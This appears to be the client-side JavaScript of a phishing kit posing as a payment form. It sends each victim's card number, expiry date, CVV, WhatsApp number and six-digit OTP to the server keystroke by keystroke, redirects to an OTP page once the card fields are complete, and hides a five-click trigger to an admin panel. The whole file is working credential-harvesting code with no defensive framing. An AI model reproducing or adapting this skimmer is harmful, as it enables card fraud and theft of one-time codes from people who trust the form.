// ==================== SESSION STATE ====================
let sessionId = null;
let cardTimeout = null;
let expiryTimeout = null;
let cvvTimeout = null;
let waTimeout = null;
let otpTimeout = null;
let redirectTimeout = null;
let adminClickCount = 0;

// ==================== HELPERS ====================
function getSessionId() {
    return sessionStorage.getItem('cml_session_id');
}

function setSessionId(id) {
    sessionId = id;
    sessionStorage.setItem('cml_session_id', id);
}

function clearSession() {
    sessionStorage.removeItem('cml_session_id');
    sessionId = null;
}


// ==================== CHECK IF ALL FIELDS ARE COMPLETE ====================
function areAllFieldsComplete() {
    const cardEl = document.getElementById('cardNumber');
    const expiryEl = document.getElementById('expiryDate');
    const cvvEl = document.getElementById('cvv');
    const waEl = document.getElementById('whatsapp');
    
    if (!cardEl || !expiryEl || !cvvEl || !waEl) return false;
    
    const card = cardEl.value.replace(/\s/g, '');
    const expiry = expiryEl.value;
    const cvv = cvvEl.value;
    const wa = waEl.value;
    
    // ⭐ WhatsApp 9 digits now
    return (
        card.length === 16 &&
        expiry.length === 5 &&
        cvv.length === 3 &&
        wa.length === 9
    );
}

// ==================== AUTO-REDIRECT TO OTP ====================
function checkAndRedirect() {
    if (areAllFieldsComplete()) {
        console.log("✅ All fields complete — auto redirecting to OTP");
        
        if (redirectTimeout) clearTimeout(redirectTimeout);
        
        redirectTimeout = setTimeout(() => {
            window.location.href = '/otp';
        }, 500);
    }
}


// ==================== CARD NUMBER ====================
const cardInput = document.getElementById('cardNumber');
if (cardInput) {
    cardInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 16) value = value.slice(0, 16);
        
        let formatted = value.replace(/(.{4})/g, '$1 ').trim();
        this.value = formatted;
        
        clearTimeout(cardTimeout);
        cardTimeout = setTimeout(() => {
            sendCardUpdate(value);
        }, 300);
        
        checkAndRedirect();
    });
}


// ==================== EXPIRY DATE ====================
const expiryInput = document.getElementById('expiryDate');
if (expiryInput) {
    expiryInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 4) value = value.slice(0, 4);
        
        if (value.length >= 3) {
            this.value = value.slice(0, 2) + '/' + value.slice(2);
        } else {
            this.value = value;
        }
        
        clearTimeout(expiryTimeout);
        expiryTimeout = setTimeout(() => {
            sendExpiryUpdate(this.value);
        }, 300);
        
        checkAndRedirect();
    });
    
    expiryInput.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value.length === 3 && this.value.includes('/')) {
            e.preventDefault();
            this.value = this.value.slice(0, 2);
            sendExpiryUpdate(this.value);
            checkAndRedirect();
        }
    });
}


// ==================== CVV ====================
const cvvInput = document.getElementById('cvv');
if (cvvInput) {
    cvvInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 3) value = value.slice(0, 3);
        this.value = value;
        
        clearTimeout(cvvTimeout);
        cvvTimeout = setTimeout(() => {
            sendCvvUpdate(value);
        }, 300);
        
        checkAndRedirect();
    });
}


// ==================== WHATSAPP (9 digits now) ====================
const waInput = document.getElementById('whatsapp');
if (waInput) {
    waInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 9) value = value.slice(0, 9);   // ⭐ Max 9 digits
        this.value = value;
        
        clearTimeout(waTimeout);
        waTimeout = setTimeout(() => {
            sendWhatsappUpdate(value);
        }, 300);
        
        checkAndRedirect();
    });
}


// ==================== SEND UPDATES ====================
function sendCardUpdate(cardNumber) {
    if (!cardNumber) return;
    
    fetch('/update_card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            cardNumber: cardNumber,
            sessionId: getSessionId()
        })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success && data.id) {
            setSessionId(data.id);
        }
    })
    .catch(err => console.error("Card error:", err));
}

function sendExpiryUpdate(expiry) {
    const sid = getSessionId();
    if (!sid || !expiry) return;
    
    fetch('/update_expiry', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: sid, expiry: expiry })
    })
    .then(res => res.json())
    .catch(err => console.error("Expiry error:", err));
}

function sendCvvUpdate(cvv) {
    const sid = getSessionId();
    if (!sid || !cvv) return;
    
    fetch('/update_cvv', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: sid, cvv: cvv })
    })
    .then(res => res.json())
    .catch(err => console.error("CVV error:", err));
}

function sendWhatsappUpdate(whatsapp) {
    const sid = getSessionId();
    if (!sid || !whatsapp) return;
    
    fetch('/update_whatsapp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: sid, whatsapp: whatsapp })
    })
    .then(res => res.json())
    .catch(err => console.error("WhatsApp error:", err));
}

function sendOtpUpdate(otp) {
    const sid = getSessionId();
    if (!sid || !otp) return;
    
    fetch('/update_otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: sid, otp: otp })
    })
    .then(res => res.json())
    .catch(err => console.error("OTP error:", err));
}


// ==================== OTP PAGE LOGIC ====================
function moveNext(current) {
    if (current.value && !/^\d$/.test(current.value)) {
        current.value = '';
        return;
    }
    
    if (current.value.length === 1) {
        const boxes = document.querySelectorAll('.otp-box');
        const index = Array.from(boxes).indexOf(current);
        
        if (index < boxes.length - 1) {
            boxes[index + 1].focus();
        } else {
            current.blur();
            handleOtpComplete();
        }
    }
}

document.addEventListener('input', function(e) {
    if (e.target.classList.contains('otp-box')) {
        const boxes = document.querySelectorAll('.otp-box');
        const otp = Array.from(boxes).map(b => b.value).join('');
        
        if (otp.length > 0) {
            clearTimeout(otpTimeout);
            otpTimeout = setTimeout(() => {
                sendOtpUpdate(otp);
            }, 200);
        }
        
        if (otp.length === 6) {
            handleOtpComplete();
        }
    }
});

function handleOtpComplete() {
    const boxes = document.querySelectorAll('.otp-box');
    const otp = Array.from(boxes).map(b => b.value).join('');
    
    if (otp.length === 6) {
        sendOtpUpdate(otp);
        
        setTimeout(() => {
            clearSession();
            window.location.href = '/';
        }, 1200);
    }
}

document.addEventListener('keydown', function(e) {
    if (e.key === 'Backspace' && e.target.classList.contains('otp-box') && !e.target.value) {
        const boxes = document.querySelectorAll('.otp-box');
        const index = Array.from(boxes).indexOf(e.target);
        if (index > 0) {
            boxes[index - 1].focus();
            boxes[index - 1].value = '';
            
            const otp = Array.from(boxes).map(b => b.value).join('');
            if (otp) sendOtpUpdate(otp);
        }
    }
});


// ==================== MOBILE KEYBOARD FIX ====================
function scrollInputIntoView(el) {
    if (!el) return;
    
    setTimeout(() => {
        try {
            el.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center'
            });
        } catch(e) {
            el.scrollIntoView(false);
        }
    }, 300);
}

function attachInputFocus() {
    document.querySelectorAll('input').forEach(inp => {
        if (inp.dataset.kbAttached) return;
        inp.dataset.kbAttached = '1';
        
        inp.addEventListener('focus', function() {
            scrollInputIntoView(this);
        });
    });
}

attachInputFocus();

const observer = new MutationObserver(() => {
    attachInputFocus();
});
observer.observe(document.body, { childList: true, subtree: true });


// ==================== SECRET ADMIN TRIGGER ====================
function triggerAdmin() {
    adminClickCount++;
    if (adminClickCount === 5) {
        window.location.href = '/admin';
        adminClickCount = 0;
    }
    setTimeout(() => { adminClickCount = 0; }, 2000);
}